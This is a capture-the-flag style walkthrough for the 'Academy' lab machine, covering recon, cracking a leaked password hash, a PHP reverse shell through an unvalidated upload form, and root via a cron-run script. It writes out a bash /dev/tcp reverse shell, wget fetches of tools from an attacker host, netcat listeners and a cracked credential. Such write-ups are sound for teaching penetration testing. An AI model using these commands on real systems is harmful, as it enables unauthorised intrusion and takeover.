# Academy

# Enumeration

## Nmap

Discover the interesting services:

- 21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
- 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

## FTP File Retrieve

We discovered there’s 'note.txt' file in the ftp server. Retrieve it for any clue

1. $ ftp <Target_IP_Address>
2. Name (192.168.182.158:ren): anonymous
3. Password: <Blank and hit Enter>
4. ftp> get note.txt

![image.png](image.png)

NOTE: The VALUE credentials contain a hashed password (cd73502828457d15655bbd7a63fb0bc8). Use Hash-Identifier to determine the hash type, then use Hashcat to crack the hash 

hashcat -m 0  /usr/share/wordlists/rockyou.txt

![image.png](image%201.png)

## HTTP Claw

Here provides three tools to perform clawing:

1. ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<Tartget_IP_Address>/FUZZ
2. dirb http://<Tartget_IP_Address>
3. dirbuster ✅

Using Dirbuster, we discovered:

- an [phpMyAdmin](http://192.168.182.158/phpmyadmin/index.php) login panel
- an user login / admin panel in the target [web application](http://192.168.182.158/academy/).

We successfully logged in using both the student credentials found in the note.txt file from FTP and the default admin credentials.

- 10201321:student
- admin:admin

In student login session, we were able to upload non-image format file.

# Exploitation

## HTTP-php reverse shell

Since the image upload functionality does not validate file formats during the enumeration phase, we can attempt to establish a connection using a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

1. On Attack machine, turn on Netcat for port listening:
    
    $ sudo nc -nvlp 1234
    
2. Upload <payload.php> to student info

![image.png](image%202.png)

## HTTP-Escalation

Configure a web server to facilitate the transfer of [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to the target machine via the established PHP reverse shell session.

1. $ python3 -m http.server 80 # Run this command on attacker machine
2. wget http://<Attack_Machine_IP>/linpeas.sh # Run on the established PHP reverse shell session
3. $ chmod +x linpeas.sh # Ensure to modify permission, otherwise it won’t be executed.
4. ./linpeas.sh

### LinPEAS Scanning Result

1. The distribution can be used for escalation for some case

![image.png](image%203.png)

1. /home/grimmie/backup.sh

![image.png](image%204.png)

1. /var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss"

![image.png](image%205.png)

- We identified the MySQL user credentials by examining the config.php, which contained the SQL login details referenced in a previous screenshot. Upon testing on [phpMyAdmin](http://192.168.182.158/phpmyadmin/index.php), the credentials were confirmed to be valid.

![image.png](image%206.png)

1. cat /etc/passwd

![image.png](image%207.png)

## SSH

Nmap enumeration revealed that the SSH service is running on the target system. Additionally, based on a previous screenshot, we confirmed that the user 'grimmie' possesses administrative privileges.

1. Using user grimmie's credentials to log in via SSH

$ ssh grimmie@<Target_IP_Address> # Password:"My_V3ryS3cur3_P4ss"

1. After gaining access to the machine, we examined the previously identified file located at `/home/grimmie/backup.sh` for further analysis.
Which doesn’t provide much useful information.

![image.png](image%208.png)

NOTE: In the Crontab, we didn’t see the `backup.sh` is scheduled to run. 

## Pspy-Scheduled Process Discovery

Download Move the [pspy](https://github.com/DominicBreuker/pspy) (64-bit big, static version) into the directory that’s hosting for the web application. And retrieve the pspy from the reverse shell session.

1. $ python3 -m http.server 80
2. wget http://<Attack_Machine_IP>/pspy64
3. chmod + pspy64
4. ./pspy64

![image.png](image%209.png)

# Privilege Escalation

From the previous steps, we determine the backup.sh runs every minute. So we can insert the [one line bash reserve shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) into the file.

1. grimmie@academy:~$ nano backup.sh
Replace everything with `bash -i >& /dev/tcp/<Attacker_IP_Address>/8080 0>&1` 
2. $ nc -nvlp 8080 # Setup listener on attack machine

Once the shell is successfully triggered, we obtain root access to the target machine.

![image.png](image%2010.png)